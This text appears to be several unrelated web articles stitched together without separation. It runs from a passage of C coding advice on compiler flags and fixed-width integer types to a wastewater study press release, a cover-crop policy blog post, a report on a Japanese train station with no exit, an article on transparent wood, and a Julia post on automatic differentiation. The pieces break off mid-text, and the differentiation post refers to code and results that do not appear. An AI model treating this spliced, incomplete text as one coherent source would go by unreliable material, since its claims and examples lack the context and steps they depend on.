<li><code>LTO</code> still needs some babysitting though. Sometimes, if your program has code not used directly but used by additional libraries, LTO can evict functions or code because it detects, globally when linking, some code is unused/unreachable and doesn’t <em>need</em> to be included in the final linked result.</li>
</ul></li>
</ul>
<p>Arch</p>
<ul>
<li><code>-march=native</code>
<ul>
<li>give the compiler permission to use your CPU’s full feature set</li>
<li>again, performance testing and regression testing is important (then comparing the results across multiple compilers and/or compiler versions) is important to make sure any enabled optimizations don’t have adverse side effects.</li>
</ul></li>
<li><code>-msse2</code> and <code>-msse4.2</code> may be useful if you need to target not-your-build-machine features.</li>
</ul>
<h2 id="_writing-code">Writing code</h2>
<h3 id="_types">Types</h3>
<p>If you find yourself typing <code>char</code> or <code>int</code> or <code>short</code> or <code>long</code> or <code>unsigned</code> into new code, you’re doing it wrong.</p>
<p>For modern programs, you should <code>#include &lt;stdint.h&gt;</code> then use <em>standard</em> types.</p>
<p>For more details, see the <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdint.h.html">stdint.h specification</a>.</p>
<p>The common standard types are:</p>
<ul>
<li><code>int8_t</code>, <code>int16_t</code>, <code>int32_t</code>, <code>int64_t</code> —&nbsp;signed integers</li>
<li><code>uint8_t</code>, <code>uint16_t</code>, <code>uint32_t</code>, <code>uint64_t</code> — unsigned integers</li>
<li><code>float</code> —&nbsp;standard 32-bit floating point</li>
<li><code>double</code> - standard 64-bit floating point</li>
</ul>
<p>Notice we don’t have <code>char</code> anymore. <code>char</code> is actually misnamed and misused in C.</p>
<p>Developers routinely abuse <code>char</code> to mean “byte” even when they are doing unsigned byte manipulations. It’s much cleaner to use <code>uint8_t</code> to mean single a unsigned-byte/octet-value and <code>uint8_t *</code> to mean sequence-of-unsigned-byte/octet-values.</p>
<h4 id="_special-standard-types">Special Standard Types</h4>
<p>In addition to standard fixed-width like <code>uint16_t</code> and <code>int32_t</code>, we also have <strong>fast</strong> and <strong>least</strong> types defined in the <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdint.h.html">stdint.h specification</a>.</p>
<p><strong>Fast</strong> types are:</p>
<ul>
<li><code>int_fast8_t</code>, <code>int_fast16_t</code>, <code>int_fast32_t</code>, <code>int_fast64_t</code> — signed integers</li>
<li><code>uint_fast8_t</code>, <code>uint_fast16_t</code>, <code>uint_fast32_t</code>, <code>uint_fast64_t</code> — unsigned integers</li>
</ul>
<p>Fast types provide a minimum of <code>X</code> bits, but there is no guarantee the underlying storage size is exactly what you request. If a larger type has better support on your target platform, a <em>fast</em> type will automatically use the better supported larger type.</p>
<p>The best example here is, on some 64-bit systems, when you request <code>uint_fast16_t</code> you actually get a <code>uint64_t</code> because operating on word-sized integers will be faster than operating on half of a 32-bit integer.</p>
<p>The <em>fast</em> guidelines aren’t followed on every system though. One standout is OS X, where <em>fast</em> types are <a href="https://opensource.apple.com/source/xnu/xnu-1456.1.26/EXTERNAL_HEADERS/stdint.h">defined exactly as their corresponding fixed width counterparts</a>.</p>
<p>Fast types can be useful for self-documenting code as well. If you know your counters only need 16 bits, but you prefer your math use 64 bit integers because they are faster on your platform, that’s where <code>uint_fast16_t</code> would help. Under 64-bit Linux platforms, <code>uint_fast16_t</code> gives you a fast 64-bit counter while maintaining the code-level inline documentation of “we only need 16 bits here.”</p>
<p>One thing to be aware of for fast types: it can impact certain test cases. If you need to test for storage width edge cases, having <code>uint_fast16_t</code> be 16 bits on some platforms (OS X) and 64 bits on other platforms (Linux) can increase the minimum number of platforms where your tests need to pass.</p>
<p><em>Fast</em> types do introduce the same uncertainty as <code>int</code> not being a standard size across platforms, but with <em>fast</em> types, you can limit your uncertainty to known-safe locations in your code (counters, temporary values with checked bounds, etc).</p>
<p><strong>Least</strong> types are:</p>
<ul>
<li><code>int_least8_t</code>, <code>int_least16_t</code>, <code>int_least32_t</code>, <code>int_least64_t</code> — signed integers</li>
<li><code>uint_least8_t</code>, <code>uint_least16_t</code>, <code>uint_least32_t</code>, <code>uint_least64_t</code> — unsigned integers</li>
</ul>
<p>Least types provide you with the most <em>compact</em> number of bits for the type you request.</p>
<p>The <em>least</em> guidelines, in practice, mean <em>least</em> types are just defined to standard fixed width types, since standard fixed width types already provide the exact minimum number of bits you request.</p>
<h4 id="_to-int-or-not-to-int">to <code>int</code> or not to <code>int</code></h4>
<p>Some readers have pointed out they truly love <code>int</code> and you’ll have to pry it from their cold dead fingers. I’d like to point out is is technically <em>impossible</em> to program correctly if the sizes of your types change out from under you.</p>
<p>Also see <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/inttypes.h.html#tag_13_19_06">RATIONALE</a> included with <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/inttypes.h.html">inttypes.h</a> for reasons why using non-fixed-width types is unsafe. If you are truly smart enough to conceptualize <code>int</code> being 16 bits on some platforms and 32 bits on other platforms throughout your development while also testing all 16 bit and 32 bit edge cases for every place you use <code>int</code>, please feel free to use <code>int</code>.</p>
<p>For the rest of us who can’t hold entire multi-level decision tree platform specification hierarchies in our heads while writing fizzbuzz, we can use fixed width types and automatically have more correct code with much less conceptual hassle and much less required testing overhead.</p>
<p>Or, said more concisely in the specification: “the ISO C standard integer promotion rule can produce silent changes unexpectedly.”</p>
<p>Good luck with that.</p>
<h4 id="_one-exception-to-never-char">One Exception to never-<code>char</code></h4>
<p>The <em>only</em> acceptable use of <code>char</code> in 2016 is if a pre-existing API requires <code>char</code> (e.g. <code>strncat</code>, printf’ing “%s”, …) or if you’re initializing a read-only string (e.g. <code>const char *hello = "hello";</code>) because the C type of string literals (<code>"hello"</code>) is <code>char []</code>.</p>
<p>ALSO: In C11 we have native unicode support, and the type of …</p></div></div>

Despite this promising finding, the authors warn that treatment rates in developing countries are still very low.

</p><p>The study and its dataset were <a href="https://href.li/?https://essd.copernicus.org/articles/13/237/2021/">published Open Access in the journal <i>Earth System Science Data</i></a>.</p><p>Humans and factories produce vast quantities of wastewater per day. If not properly collected and treated, wastewater may severely threaten human health and pollute the environment.</p><h2><b>144 million swimming pools</b></h2><p>The authors use national statistics to estimate volumes of wastewater production, collection, treatment and reuse. “Globally, about 359 billion cubic metres of wastewater is produced each year, equivalent to 144 million Olympic-sized swimming pools,” says <a href="https://href.li/?https://www.uu.nl/staff/ERJones">Edward Jones &nbsp;external link</a>, PhD researcher at Utrecht University and lead author of the study. “About 48 percent of that water is currently released untreated. This is much lower than the frequently cited figure of 80 percent.”</p><p>While the results show a more optimistic outlook compared to previous work, the authors stress that many challenges still exist. “We see that particularly in the developing world, where most of the future population growth will likely occur, treatment rates are lagging behind,” Jones explains. “In these countries in particular, wastewater production is likely to rise at a faster pace than the current development of collection infrastructure and treatment facilities. This poses serious threats to both human health and the environment. There is still a long way to go!”</p><h2><b>Creative reuse</b></h2><p>The main problem, especially in the developing world, is the lack of financial resources to build infrastructure to collect and treat wastewater. This is particularly the case for advanced treatment technologies, which can be prohibitively expensive. However, the authors highlight potential opportunities for creative reuse of wastewater streams that could help to finance improved wastewater treatment practices.</p><p>“The most obvious reuse of treated wastewater is to augment freshwater water supplies,” Jones states. Treated wastewater reuse is already an important source of irrigation water in many dry countries, particularly in the Middle East and North Africa. However, only 11% of the wastewater produced globally is currently being reused, which shows large opportunities for expansion.</p><h2><b>From ‘waste’ to resource</b></h2><p>“But freshwater augmentation is not the only opportunity,” says Jones. “Wastewater also has large potential as a source of nutrients and energy. Recognition of wastewater as a resource, opposed to as ‘waste’, will be key to driving improved treatment going forward.”</p><p>However, the authors stress the importance of proper monitoring of wastewater treatment plants, accompanied by strong legislation and regulations, to ensure that the reuse of wastewater is safe. The authors also acknowledge public acceptance as another key barrier towards increasing wastewater reuse.</p><p>The data and associated journal article are freely available through <a href="https://href.li/?https://doi.pangaea.de/10.1594/PANGAEA.918731">PANGAEA &nbsp;external link</a>and <a href="https://href.li/?https://essd.copernicus.org/articles/13/237/2021/">Earth System Science Data &nbsp;external link</a>, respectively.</p><p>–</p><p><b>Source:&nbsp;<a href="https://href.li/?https://www.uu.nl/en">Utrecht University</a></b></p><p><b>Full study:</b>&nbsp;“Country-level and gridded estimates of wastewater production, collection, treatment and reuse”,&nbsp;<i>Earth System Science Data</i>.</p><p><a href="https://href.li/?https://doi.org/10.5194/essd-13-237-2021">https://doi.org/10.5194/essd-13-237-2021</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/640682792374747137/microplastics-waste-water-electrolyte-treatment">Proof of concept: Electrolytic treatment of wastewater degrading microplastics at the source</a></p>

<p>Steve Groff <a rel="noreferrer noopener" href="https://agfundernews.com/regenerative-agriculture-president-biden-the-future-of.html" data-type="URL" data-id="https://agfundernews.com/regenerative-agriculture-president-biden-the-future-of.html" target="_blank">recently posted some thoughts</a> on regenerative agriculture in light of a new incoming U.S. presidential administration and offered thoughts on cover crops, among other things. As Steve is a well known figure in the space, it’s worth a read. I agree that regenerative agriculture practices <em>are</em> scalable, and have used this space to argue as much. However, I fundamentally disagree that there is an education hurdle to overcome and that the government (in <em>some</em> role) has no place in getting regenerative agriculture scaled up enough to have a positive impact on national soil health or carbon sequestration. The government most certainty has a role– probably an active one as agriculture is both a strategic and an economic resource. I’ve proposed a solution to repartition the dollars already <em><a rel="noreferrer noopener" href="https://data.ers.usda.gov/reports.aspx?ID=17833" data-type="URL" data-id="https://data.ers.usda.gov/reports.aspx?ID=17833" target="_blank">budgeted for and used</a></em> and distributed as direct payments (mostly to row crops farmers) and instead of simply pay farmers for planting cover crops or adapting other soil health positive practices. The problem has never been about education in my opinion. Cover crops and complex crop rotations have been around a long time. Most farmers could reasonably figure out the <em>technical</em> challenges associated with managing these complex rotations (within reason) once the <em>economic</em> challenges become clear. To be clear technical challenges remain, but farmers have a strong track record of innovation. I understand the desire to keep the government out and let the markets work, but agriculture is one of the few industries few a free market hasn’t realistically existed for many years. Between <a rel="noreferrer noopener" href="https://www.desmoinesregister.com/story/money/agriculture/2018/06/15/china-tariffs-soybeans-could-cost-iowa-farmers-up-624-million/705121002/" data-type="URL" data-id="https://www.desmoinesregister.com/story/money/agriculture/2018/06/15/china-tariffs-soybeans-could-cost-iowa-farmers-up-624-million/705121002/" target="_blank">tariffs</a>, <a rel="noreferrer noopener" href="https://www.afge.org/article/privatization-of-grain-inspection-proves-to-be-a-complete-failure.-lawmakers-want-to-do-it-anyway/" data-type="URL" data-id="https://www.afge.org/article/privatization-of-grain-inspection-proves-to-be-a-complete-failure.-lawmakers-want-to-do-it-anyway/" target="_blank">inspections</a>, subsidies, and various <a rel="noreferrer noopener" href="https://www.epa.gov/renewable-fuel-standard-program" data-type="URL" data-id="https://www.epa.gov/renewable-fuel-standard-program" target="_blank">legislation</a> there are never been a ‘free’ market as much as farmers want and desire it. We must admit that and get past it–farmers especially must admit it because there are areas of the world that can produce our row crops for much cheaper on a U.S. dollar denominated basis. Instead, let’s build ways to maximize the government efforts for keeping the markets open whill still providing incentive for regenerative practices. One way the government (USDA) <em>can</em> <em>help</em> with the technical challenges of cover crops is many crop specie have not been bred/modified for these purposes. With the advanced genetic tooling available to scientists today, there is no reason these species (rye, mustard, radishes, buckwheat, grasses, etc.) can’t be modified for having cover crop desirable traits. Many of these species have been forgotten or neglected by large multi-national companies because of the inability to capitalize a profit on them. They are inherently low-margin.</p>



<p>Farmers, society, the environment, and the government all have the potential to ‘win’ by adopting sustainable soil practices:</p>



<ul><li>Farmers: More fertile ground equates to more productive harvests for commodity or cash crops</li><li>Society: More carbon is sequestered mitigating climate/water quality changes</li><li>Environment: Living roots growing on ground 365 days of the year allows for healthier ecosystem</li><li>Government: Building resiliency into food supply sources can help keep food prices stable</li></ul>



<p>I continue to posit farmers don’t do these practices is <em>not</em> because of lack of understanding or some inherent nihilistic mindset: it is because they are footing the bill. If done at scale, the sole purpose of a cover crop will be to sequester carbon. It costs <a rel="noreferrer noopener" href="https://www.extension.iastate.edu/agdm/crops/pdf/a3-10.pdf" data-type="URL" data-id="https://www.extension.iastate.edu/agdm/crops/pdf/a3-10.pdf" target="_blank">no less than $15 per acre</a> to plant a cover crop. The <a rel="noreferrer noopener" href="https://nori.com/" data-type="URL" data-id="https://nori.com/" target="_blank">market rates</a> for a ton of carbon are about $15. Only <a rel="noreferrer noopener" href="http://comet-farm.com/" data-type="URL" data-id="http://comet-farm.com/" target="_blank">0.20-0.40 tons per acre</a> can be realistically captured assuming we just want to add cover crops to existing row crops acres. Soil friendly practices such as grasslands <a rel="noreferrer noopener" href="https://www.fsa.usda.gov/Assets/USDA-FSA-Public/usdafiles/Conservation/PDF/One-Pager%20December%202020.pdf" data-type="URL" data-id="https://www.fsa.usda.gov/Assets/USDA-FSA-Public/usdafiles/Conservation/PDF/One-Pager%20December%202020.pdf" target="_blank">pay only $13 per acre</a>. There is simply no profit for the farmer–why would they willingly adapt unprofitable practices? The USDA can help bridge that via policy changes. They already make unprofitable endeavors profitable via subsidies. They can jump start the mass adoption of cover crops this way. The private sector is probably doomed to fail; carbon markets from companies like <a rel="noreferrer noopener" href="https://nori.com/" data-type="URL" data-id="https://nori.com/" target="_blank">Nori</a>, <a rel="noreferrer noopener" href="https://www.fbn.com/" data-type="URL" data-id="https://www.fbn.com/" target="_blank">FBN</a>, <a rel="noreferrer noopener" href="https://www.indigoag.com/for-growers/indigo-carbon" data-type="URL" data-id="https://www.indigoag.com/for-growers/indigo-carbon" target="_blank">Indigo</a> are <span>not</span> a sustainable solution because these are extension of the <span>current</span> agriculture input scene that is designed to squeeze farmers and add overhead so that companies can be profitable. At best, these companies will want to leverage their carbon markets to lock-in farmers to other profitable revenue streams.</p>



<p>The final reason why I believe achieving regenerative agriculture practices at scale is not an education problem but an economic one is this: The farmers <em>currently</em> doing these practices who are the cited sources for being profitable are outliers. They likely represent some sort of top percentile as far as ‘farmers’ can be ranked. Although not real data, this confirms my own experience in talking with people who are doing this (and presumably haven’t been bankrupted by it). These farmers represent a different mindset in that they don’t want to be sold anything, but rather figure it out by themselves whereas the vast majority of ‘normal’ farmers look to experts for advice and recommendations–see the financial success of agriculture input companies for confirmation. But these successful farmers own admission, maintaining profitability on a ‘non-traditional’ operation is difficult and requires much trial and error. The entire system must have proper synergy and be hedged appropriately. There is also an infinite combination of ‘successful paths’ so no 2 farms will likely be the same. This is mostly in stark contrast to the trend of homogenization of the farm in the post-GMO era where many farmers are simply planting vanilla maize/soybean rotations using the same set of chemicals. I am a believer that outliers don’t scale, so its not about really sharp people simply educating the masses. It’s analogous to attempting scaling the concept of a ’10x developer’ in software engineering via education. Much like no amount of education will turn the majority of software engineers into a 10x developer, If we think we can turn every farmer into a 10x farmer, we will fail. Focus on getting the economic side shored up, the technical side will follow easily.</p>

	<p>Japan is a country filled with beautiful scenery and travel spots that are famous worldwide.</p><!-- google_ad_start -->
<!-- /34009881/Articles_BTF -->

<!-- google_ad_end --><p> In here there is a train station that is found in an isolated area along the Nishiki River in Iwakuni, with no entrance and no exit.
</p><p>Located on the Nishikigawa Seiryu Line, the station, ‘Seiryu Miharashi Eki,’ which translates to “Clear Stream Viewing Platform Station“ is only accessible by train on Yamaguchi Prefecture’s Nishikigawa Railway. With its limited access, the spot was created solely as a spot where visitors could admire the nature views that surround it.</p><!-- google_ad_start -->

<p>When people arrive at the station, they will see that there are no stairs, ramps, or even a ticket counter, as it is not intended for people to leave the platform.</p><!-- google_ad_start -->

<p>Railways systems in Japan are one of the finest in the world. The country has the most well-connected and efficient systems in the world. They are also so punctual that the Tsukuba Express released a public apology for leaving the station 20 seconds early.</p><!-- google_ad_start -->

<p>The station opened on March 17th of this year and sits on a mountainside in the Yamaguchi Prefecture of Japan.</p>

<p>The Nishiki River is the longest river in the Yamaguchi Prefecture, flowing 110 km long. The source of the river is found in the city of Shunan and drains into the Inland Sea. Japan is home to numerous rivers which is probably why it is home to the longest train bridge in the world, the Seto Ohashi Bridge which connects Okayama Prefecture on Honshu to Kagawa Prefecture on Shikoku Island.</p><!-- google_ad_start -->

<p>Local reports stated that passengers will only be able to stop at Seiryu Miharashi Eki during special train events like the sake-tasting event and the train will be scheduled to run on that line during March 31st to April 1st.</p>

<p>A train platform with no entrance or exit that is not accessible all-year round maybe be odd but Japan has many odd train stations. For example,&nbsp;the Tsushimanomiya Station, on the island of Shikoku is only open twice a year to celebrate the local summer festival at the Tsushima Shrine.</p><!-- google_ad_start -->

<p>The new station is a magical place to stop by and the scenery around there is absolutely beautiful.</p>

It could become an energy efficient building material in the future.</p>  <p>Wood is made of two basic ingredients: cellulose, which are tiny fibres, and lignin, which bonds those fibres together to give it strength.</p>  <p>Tear a paper towel in half and look closely along the edge. You will see the little cellulose fibres sticking up. Lignin is a glue-like material that bonds the fibres together, a little like the plastic resin in fibreglass or carbon fibre. The lignin also contains molecules called chromophores, which give the wood its brown colour and prevent light from passing through.</p>  <p>Early attempts to make transparent wood involved removing the lignin, but this involved hazardous chemicals, high temperatures and a lot of time, making the product expensive and somewhat brittle. The new technique is so cheap and easy it could literally be done in a backyard.</p>  <p>Starting with planks of wood a metre long and one millimetre thick, the scientists simply brushed on a solution of hydrogen peroxide using an ordinary paint brush. When left in the sun, or under a UV lamp for an hour or so, the peroxide bleached out the brown chromophores but left the lignin intact, so the wood turned white.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg"></p></div><figcaption>Researchers demonstrated after brushing a coat of hydrogen peroxide on the opaque wood material, and exposing it to one hour of sunlight, it turns transparent.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Next, they infused the wood with a tough transparent epoxy designed for marine use, which filled in the spaces and pores in the wood and then hardened.&nbsp;This made the white wood transparent.</p>  <p>You can see a similar effect by taking that same piece of paper towel, dip half of it in water and place it on a patterned surface.&nbsp;The white paper towel will become translucent with light passing through the water and cellulose fibres without being scattered by refraction.</p>  <p>The epoxy in the wood does an even better job, allowing 90 per cent of visible light to pass through.

The clear wood&nbsp;is lighter than glass, with better insulating properties, which is important because windows are a major source of heat loss in buildings. It also might take less energy to manufacture clear wood because there are no high temperatures involved.</p>  <p>Transparent wood could become an alternative to glass in energy efficient buildings, or perhaps coverings for solar panels in harsh environments. There could be no end of uses.</p>      <p>Many different types of wood, from balsa to oak, can be made transparent, and it doesn't matter if it is cut along the grain or against it. If the transparent wood is made a little thicker, it would be strong enough to become part of the structure of a building, so there could be entire transparent wooden walls.</p>  <p>While this technology has yet to&nbsp; be scaled up to industrial levels, the researchers say it has great potential as a new building material. In fact, they say that theoretically, an entire house could be made transparent. It is not clear why anyone would want to live in a transparent house, but for people who do, it would be OK to throw stones…</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-qinqin-xia-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-qinqin-xia-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-qinqin-xia-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-qinqin-xia-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg"></p></div><figcaption>A researcher holds up a 10-centimetre long slab of the see-through wood.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Images copyright Xia et al.&nbsp;<a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="license">Creative Commons Attribution-NonCommercial license</a>,&nbsp;</p></span></p></div></div>]]>

      <p>Griewank and Walther’s 0th Rule of algorithmic differentiation (AD) states:</p>

<blockquote>
  <p>Algorithmic differentiation does not incur truncation error.</p>
</blockquote>

<p>(<a href="https://dl.acm.org/doi/book/10.5555/1455489">2008, “Evaluating Derivatives: Principles and Techniques of Algorithmic Differentiation”, Andreas Griewank and Andrea Walther.</a>)</p>

<p>In this blog post I will show you a case that looks like it does in fact incur truncation error.
Though this case will arguably be a misinterpretation of that rule.
This blog post will thus highlight why careful interpretation of the rule is necessary.
Further it will motivate why we need to often add more custom sensitivity rules (custom primitives) to our AD systems, even though you can AD anything with just a few basic rules.</p>

<p>Credit to <a href="https://mikeinnes.github.io/">Mike Innes</a> who pointed this out to me at JuliaCon 2018.

<p>We will start by implementing a simple forwards mode AD.
This implementation is based on <a href="https://juliadiff.org/ChainRulesCore.jl/dev/autodiff/operator_overloading.html#ForwardDiffZero">ForwardDiffZero from the ChainRules docs.</a>, but without ChainRules support.
Though it is also the simplest most stock-standard implementation once can conceive of.</p>

<h2 id="2-implement-sin-and-cos-for-demonstration-purposes">2. Implement Sin and Cos, for demonstration purposes</h2>

<p>Now we are going to implement the <code>sin</code> and <code>cos</code> functions for demonstration purposes.
<a href="https://github.com/JuliaLang/julia/blob/v1.5.3/base/special/trig.jl">JuliaLang has an implementation of <code>sin</code> and <code>cos</code> in Julia</a>, that could be ADed though by a source to source AD (like <a href="https://github.com/FluxML/Zygote.jl">Zygote.jl</a>).
But because it is restricted to <code>Float32</code> and <code>Float64</code> an operator overloading AD like ours can’t be used with it.
That’s Ok we will just code up a simple one using Taylor polynomials.
we know that eventually the code run does have to look something like this, since all operations are implemented in terms of <code>+</code>, <code>*</code> and <code>^</code>, <code>/</code>, bit-shifts and control-flow.
(Technically <a href="https://en.wikipedia.org/wiki/X86_instruction_listings#Added_with_80387">x86 assembly</a> does have a primitive for <code>sin</code> and <code>cos</code> but as far as I know no LibM actually uses them. There is a <a href="https://reviews.llvm.org/D36344">discussion of why LLVM</a> doesn’t ever emit them if you go looking)
The real code would include control flow to wrap around large values and stay close to zero, but we can skip that and just avoid inputting large values.</p>

<p>So using Taylor polynomials of degree 12 for each of them:</p>

<div><div><pre><code><span>my_sin</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>x</span> <span>-</span> <span>x</span><span>^</span><span>3</span><span>/</span><span>factorial</span><span>(</span><span>3</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>5</span><span>/</span><span>factorial</span><span>(</span><span>5</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>7</span><span>/</span><span>factorial</span><span>(</span><span>7</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>9</span><span>/</span><span>factorial</span><span>(</span><span>9</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>11</span><span>/</span><span>factorial</span><span>(</span><span>11</span><span>)</span>  <span># + 0*x^12</span>

</code></pre></div></div>

<p>Check the accuracy
we know that  <code>sin(π/3) == √3/2</code>, and that <code>cos(π/3) == 1/2</code>
(note that yes, <code>π</code> and <code>√3/2</code> are  approximating here but they are very accurate one. And this doesn’t change the result that follows.)</p>

<p>This is not terrible.
<code>cos</code> is slightly more accurate than <code>sin</code>. 
We have a fairly passable implementation of <code>sin</code> and <code>cos</code>.</p>

<h2 id="3-now-lets-do-ad">3. Now lets do AD.</h2>

<p>We know the derivative of <code>sin(x)</code> is <code>cos(x)</code>.
So if we take the derivative of <code>my_sin(π/3)</code> we should get <code>my_cos(π/3)≈0.5</code>.
<em>It should be as accurate as the original implementation, right?</em>
because Griewank and Walther’s 0th Rule:</p>

<p>Wait a second.
That doesn’t seem accurate, we expected 0.5, or at least something pretty close to that.
<code>my_cos</code> was accurate to $2 \times 10^{-11}$.
<code>my_sin</code> was accurate to $3 \times 10^{-10}$
How accurate is this:</p>

<p>What went wrong?</p>

<h2 id="4-verify">4. Verify</h2>

<p>Now, I did implement an AD from scratch there.
So maybe you are thinking that I screwed it up.
Maybe a reverse mode AD would not suffer from this problem; or maybe one that uses source to source?
Lets try some of Julia’s many AD systems then.</p>

<p>Ok, I just tried <strong>7</strong> AD systems based on totally different implementations.
I mean <a href="https://github.com/wsmoses/Enzyme.jl/">Enzyme</a> is reverse mode running at the LLVM level.
Totally different from <a href="https://github.com/JuliaDiff/ForwardDiff.jl">ForwardDiff</a> which is the more mature version of the forward mode operator overloading AD I coded above.
Every single one agreed with my result, up to <a href="https://en.wikipedia.org/wiki/Unit_in_the_last_place">1 ULP</a>.
I think that last digit changing is probably to do with order of addition (IEEE floating point math is funky), but that is another blog-post.
So I think we can reliably say that this is what an AD system will output when asked for the derivative of <code>my_sin</code> at <code>π/3</code>.</p>

<h2 id="5-explanation">5. Explanation</h2>

<p>Why does AD seem to be incurring truncation errors?
Why is the derivative of <code>my_sin</code> much less accurate than <code>my_cos</code>?</p>

<p>The AD system is (as you might have surmised) not incurring truncation errors.
It is giving us exactly what we asked for, which is the derivative of <code>my_sin</code>.
<code>my_sin</code> is a polynomial.
The derivative of the polynomial is:</p>
<div><div><pre><code><span>d_my_sin</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span>-</span> <span>3</span><span>x</span><span>^</span><span>2</span><span>/</span><span>factorial</span><span>(</span><span>3</span><span>)</span> <span>+</span> <span>5</span><span>x</span><span>^</span><span>4</span><span>/</span><span>factorial</span><span>(</span><span>5</span><span>)</span> <span>-</span> <span>7</span><span>x</span><span>^</span><span>6</span><span>/</span><span>factorial</span><span>(</span><span>7</span><span>)</span> <span>+</span> <span>9</span><span>x</span><span>^</span><span>8</span><span>/</span><span>factorial</span><span>(</span><span>9</span><span>)</span> <span>-</span> <span>11</span><span>x</span><span>^</span><span>10</span><span>/</span><span>factorial</span><span>(</span><span>11</span><span>)</span>
</code></pre></div></div>
<p>which indeed does have</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>d_my_sin</span><span>(</span><span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.4999999963909432</span>
</code></pre></div></div>
<p><code>d_my_sin</code> is a lower degree polynomial approximation to <code>cos</code> than <code>my_cos</code> was, so it is less accurate.
Further, you can see that while n-derivative of <code>sin</code> is always defined as <code>sin(x+n*π/2)</code>, as we keep taking derivatives of the polynomial approximations terms keep getting dropped.
AD is making it smoother and smoother til it is just a flat <code>0</code>.</p>

<p>The key take away here is that <em>the map is not the territory</em>.
Most nontrivial functions on computers are implemented as some function that that approximates (<em>the map</em>) the mathematical ideal (<em>the territory</em>).
Automatic differentiation gives back a completely accurate derivative of the that function (<em>the map</em>) doing the approximation.
<em>Furthermore, the accurate derivative of an approximation to the idea (e.g <code>d_my_sin</code>), is less accurate than and approximation to the (ideal) derivative of the ideal (e.g. <code>my_cos</code>).</em>
There is no truncation error in the work the AD did; but there is a truncation error in the sense that we are now using a more truncated approximation that we would write ourselves.</p>

<p>So what do?
Well-firstly, do you want to do anything?
Maybe the derivative of the approximation is more useful.
(I have been told that this is the case for some optimal control problems).
But if we want to fix it can we?
Yes, the answer is to insert domain knowledge, telling the AD system directly what the approximation to the derivative of the ideal is.
The AD system doesn’t know its working with an approximation, and even if it did, it doesn’t know what the idea it is approximating is.
The way to tell it is with a custom primitive i.e. a custom sensitivity rule.
This is what the ChainRules project in Julia is about, being able to add custom primitives for more things.</p>

<p>Every real AD system already has a primitive for <code>sin</code> built in
(which is one of the reasons I had to define my own above).
but it won’t have one for every novel system you approximate.
E.g. for things defined in terms of differential equation solutions or other iterative methods.</p>

<p>We can define in our toy AD at the start this custom primitive via:</p>
<div><div><pre><code><span>function</span><span> my_sin</span><span>(</span><span>x</span><span>::</span><span>Dual</span><span>)</span>
    <span>return</span> <span>Dual</span><span>(</span><span>my_sin</span><span>(</span><span>primal</span><span>(</span><span>x</span><span>)),</span> <span>partial</span><span>(</span><span>x</span><span>)</span> <span>*</span> <span>my_cos</span><span>(</span><span>primal</span><span>(</span><span>x</span><span>)))</span>
<span>end</span>
</code></pre></div></div>
<p>and it does indeed fix it.</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.5000000000217777</span>

<span>julia</span><span>&gt;</span> <span>abs</span><span>(</span><span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span> <span>-</span> <span>0.5</span><span>)</span>
<span>2.177769076183722e-11</span>
</code></pre></div></div>

<h3 id="bonus-will-symbolic-differentiation-save-me">Bonus: will symbolic differentiation save me?</h3>

<p>Most symbolic differentiation systems will have a rule just like the custom primitive for <code>sin</code> built in.
